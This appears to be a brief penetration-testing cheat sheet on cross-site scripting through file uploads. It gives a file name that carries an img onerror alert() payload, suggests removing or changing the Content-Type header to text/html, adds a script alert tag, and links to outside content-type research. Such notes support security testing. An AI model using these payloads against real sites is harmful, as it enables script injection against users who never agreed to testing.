_____

# XSS in File Name

```
filename="test<img src=x onerror=alert()>.png"
```

# Bypassing Content Types

Try deleting Content-Type
```
Content-Type: text/html
```

Add `<script>alert()</script>`

# Content/MIME Types

https://github.com/BlackFan/content-type-research/blob/master/XSS.md

